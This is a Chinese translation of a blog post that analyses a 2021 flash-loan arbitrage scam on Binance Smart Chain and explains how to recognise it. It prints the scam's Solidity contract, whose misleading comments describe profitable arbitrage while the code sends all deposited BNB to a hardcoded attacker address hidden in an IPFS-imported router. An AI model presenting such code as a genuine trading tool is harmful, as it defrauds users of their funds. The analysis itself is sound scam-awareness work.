# Analysis of a technical smart contract scam-一起智能合约骗局剖析


> 原文链接：https://jeiwan.net/posts/flashloan-scam/
>
> 作者：Ivan Kuznetsov
>
> 翻译：https://github.com/7Levy

## 引言

我曾经在油管上看到一个叫做“我是如何在BSC上通过闪电贷套利获取BNB的"的视频。这个视频标题很引人注目，因为在2021年初每个关注加密领域的人知道BSC链，它是以太坊的克隆链，并且大家肯定听说过在这个区块链上的DeFi被多次攻击。

在以太坊上DeFi项目的成功后，币安创造了一个以太坊的复制品，据称币安资助了许多成功和先进的类以太坊DeFi项目。一切看起来都很好，直到2021年春天发生的一系列针对BSC的黑客攻击。

大多数攻击使用的是类似的方案：

1. DeFi合约在代币余额计算上存在漏洞。
2. 攻击者使用闪电贷去扩充代币池。
3. 攻击者随后利用这些漏洞去做一些大额交易或者代币互换操作，欺骗合约认为所有余额都是正确的。
4. 攻击者归还闪电贷后能从中获取些许利润。

所以，对于任何一个听说过这些攻击的人来说（包括我）都跃跃欲试。

## 骗局细节

该视频的作者分享了他们是如何通过闪电贷进行一笔套利并赚取一些BNB（当时BNB价值大概为400美金一个），而且，他们十分大方地分享了这项技术。

1. 观众要去部署一个智能合约去完成这项工作。
2. 为了支付交易费用，观众要在合同中存取0.25BNB。该合约属于观众，所以一切看起来很安全。
3. 然后，观众需要执行合约的闪电贷函数。

作者甚至将合约上传到了以太坊在线IDE Remix上，观众只需要点击几个按钮。不难想到很多人跟着这个教程做然后失去了0.25BNB，他们存入合约然后没有得到任何回报。在写本文的时候，已经有超过44个BNB（17500多美金）被从攻击者的地址存取。

## 如何识破这类骗局

先说第一点，明显的是0.25BNB的费用：对于BSC来说是比十分高昂的手续费，你几乎不会提交一个高额成本的交易。显然，攻击者不希望交易过于可疑，将金额设置的足够低，看起来就像一笔真正的费用，但大到足以满足他们的贪婪。

第二点，如果你不知道一个合约是如何运作的，永远不要去运行它。如下是观众们按照指引部署的合约（注释是作者添加的）。

```
pragma solidity ^0.5.0;

// PancakeSwap Smart Contracts
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";

//BakerySwp Smart contracts
import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";

// Router
import "ipfs://QmUSQQNWBJ6snmx5FvafDSBCPCy63BLTpwM61dYjRzwLkN";

// Multiplier-Finance Smart Contracts
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";

contract InitiateFlashLoan {
    RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;
        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        address(uint160(router.pancakeSwapAddress())).transfer(
            address(this).balance
        );

        //Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
        router.borrowFlashloanFromMultiplier(
            address(this),
            router.bakerySwapAddress(),
            flashLoanAmount
        );

        //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
        router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);

        //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
        router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);

        //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
        router.transferBnbToMultiplier(router.pancakeSwapAddress());

        //Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}
```

一切看起来都很不错：

1. 导入官方的PancakeSwap、BakerySwap和Multiplier-Finance合约。
2. 导入一个路由合约(IPFS???)
3. 然后经过flashloan函数发送合约的以太给PancakeSwap的地址，接着从Multiplier-Finance借一笔闪电贷，进行套利交易，支付贷款，最后将一些利润返还给合约。

事实上，合约只做了一件事，它把所有存入合同的BNB发送到了攻击者的地址，IPFS导入看起来很可疑，他们在那里使用IPFS是有原因的：我们因此很难获得路由合约并查看它在做什么。

路由合约包含了很多行使得其混杂难以阅读，但我们不难发现一个重要的部分：

```
...

contract RouterV2 {
    ...
    function pancakeSwapAddress() public pure returns (address) {
        return 0x2593F13d5b7aC0d766E5768977ca477F9165923a;
    }

    ...
}
```

这是主合约将所有资金发送出去的地址。

## 总结

 这个骗局是个很有意思的案例：大多数骗局针对的是不懂技术的加密货币用户，而且这个骗局的目标人群是知道闪电贷攻击、部署合约以及交互的人，这不是一个大众群体，但是就像我们看见的一样，许多人任然成为骗局的受害者。

如果你喜欢阅读区块链安全和黑客事件，我非常推荐去订阅[Blockchain Threat Intelligence](https://blockthreat.substack.com/?utm_source=jeiwan.net&utm_medium=blog&utm_content=textlink)。


